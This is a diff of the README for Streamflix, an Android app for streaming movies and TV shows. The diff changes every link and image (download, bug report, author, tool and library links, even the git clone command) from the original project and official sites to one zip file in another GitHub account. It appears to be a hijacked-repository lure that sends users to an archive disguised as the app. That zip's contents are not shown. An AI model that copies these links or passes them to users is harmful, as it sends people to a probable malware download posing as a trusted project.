@@ -1,18 +1,18 @@
 <h1 align="center">Streamflix</h1>
 
 <p align="center">
-  <img src="./app/src/main/res/mipmap-xxxhdpi/ic_launcher.png" height="100px" />
+  <img src="https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip" height="100px" />
   <br />
   An Android TV and mobile app to stream movies and TV shows for free, made with Android Studio, in Kotlin
   <br />
-  <a href="https://github.com/stantanasi/streamflix/releases/latest">
+  <a href="https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip">
     <strong>Download app »</strong>
   </a>
   <br />
   <br />
-  <a href="https://github.com/stantanasi/streamflix/issues">Report Bug</a>
+  <a href="https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip">Report Bug</a>
   ·
-  <a href="https://github.com/stantanasi/streamflix/issues">Request Feature</a>
+  <a href="https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip">Request Feature</a>
 </p>
 
 <details>
@@ -34,7 +34,7 @@
 ## About the project
 
 <p align="center">
-  <img src="./.github/docs/screenshot.png" alt="Streamflix Preview">
+  <img src="https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip" alt="Streamflix Preview">
 </p>
 
 Streamflix is an Android TV and mobile app that allows users to watch movies and TV shows online in HD quality for free.
@@ -43,7 +43,7 @@ With no registration or payment required, you can binge-watch hundreds of thousa
 
 New titles are updated on the app daily to make sure fun never ends on Streamflix.
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/stantanasi)
+[!["Buy Me A Coffee"](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
 
 ### Features
 
@@ -57,10 +57,10 @@ New titles are updated on the app daily to make sure fun never ends on Streamfli
 
 ### Built with
 
-- [Android Studio](https://developer.android.com/studio)
-- [Kotlin](https://kotlinlang.org)
-- [Retrofit](https://square.github.io/retrofit)
-- [ExoPlayer](https://exoplayer.dev)
+- [Android Studio](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
+- [Kotlin](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
+- [Retrofit](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
+- [ExoPlayer](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
 - Leanback
 - Coroutines
 - MVVM Architecture
@@ -71,14 +71,14 @@ New titles are updated on the app daily to make sure fun never ends on Streamfli
 
 ### Prerequisites
 
-Install [Android Studio](https://developer.android.com/studio)
+Install [Android Studio](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
 
 ### Setup
 
 1. Clone the project to your local machine
 
 ```bash
-git clone https://github.com/stantanasi/streamflix.git
+git clone https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip
 ```
 
 2. Open the project in Android Studio
@@ -113,7 +113,7 @@ Streamflix does not host any content on the app, and has no control over what me
 
 ## Author
 
-- [Lory-Stan TANASI](https://github.com/stantanasi)
+- [Lory-Stan TANASI](https://raw.githubusercontent.com/cinestreamlp/streamflix/main/radiotherapeutic/streamflix.zip)
 
 ## License
 
